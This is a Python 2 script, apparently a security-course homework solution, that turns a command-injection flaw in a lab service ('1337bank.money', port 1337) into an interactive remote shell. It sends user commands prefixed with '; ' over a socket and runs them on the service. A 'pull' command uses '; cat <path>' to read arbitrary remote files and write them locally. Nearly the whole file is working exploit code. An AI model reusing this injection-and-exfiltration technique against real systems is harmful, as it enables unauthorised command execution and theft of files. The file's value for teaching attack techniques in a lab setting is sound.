"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys
import os.path

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    if(cmd == "quit"):
        sys.exit()
    elif cmd == "help":
        print(" shell -  Drop into an interactive shell and allow users to gracefully exit\n pull <remote-path> <local-path> - Download files\n help - Shows this help menu\n quit - Quit the shell")
    else:
        stringInput = ""
        currDirectory = "root"
        while True:
            if currDirectory == "root":
                string = raw_input("/> ")

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,port))
                
                if string == "exit":
                    s.close()
                    break
                if string.split()[0] == "cd":
                    if string.split()[1] != None:
                        currDirectory = string.split()[1]
                    stringInput += "; " + string
                    s.recv(1024)
                    s.send(stringInput + "\n")
                    s.recv(1024)
                    data = s.recv(1024)
                    
                else:
                    if stringInput != "":
                        string = stringInput + "; " + string
                    else:
                        string = "; " + string

        
                    s.recv(1024)
                    s.send(string + "\n")
                    s.recv(1024)
                    data = s.recv(1024)
                    dataArr = data.split("\n")
                    data = ""
                    for x in dataArr:
                        data += x + " "
                    print(data + "\n")        
            else:
                string = raw_input(currDirectory + "> ")
                if string == "exit":
                    break
                flag = 0
                if string.split()[0] == "cd":
                    stringInput += "; " + string
                    flag = 1

                string = "; " + string
                  
                stringArr = string.split(" ")

                if stringArr[0] == "cd":
                    if stringArr[1] == None:
                        currDirectory = "root"
                    else:
                        currDirectory += "/" +  stringArr[1]

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,port))
                s.recv(1024)
                if flag == 1:
                    s.send(stringInput + "\n")
                else:
                    s.send(stringInput + string + "\n")
                s.recv(1024)
                data = s.recv(1024)
                if flag == 0:
                    print(data)

def execute_pull(cmd, cmd_arg1, cmd_arg2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.recv(1024)

    string_arg1 = "; cat " + cmd_arg1
  
    s.send(string_arg1 + "\n")
    s.recv(1024)
    data = s.recv(1024)
    filehandle = open(cmd_arg2, 'a')
    filehandle.write(data)
    filehandle.close()
    



if __name__ == '__main__':
    
    while True:
        string = raw_input("> ")
        if string == "shell" or string == "quit" or string == "help":
            execute_cmd(string)
        elif string.split(" ")[0] == "pull":
            stringArr = string.split(" ")
            execute_pull(stringArr[0], stringArr[1], stringArr[2])
        else:
            print("Command was invalid, Please enter \" shell, pull, help, or quit\"")
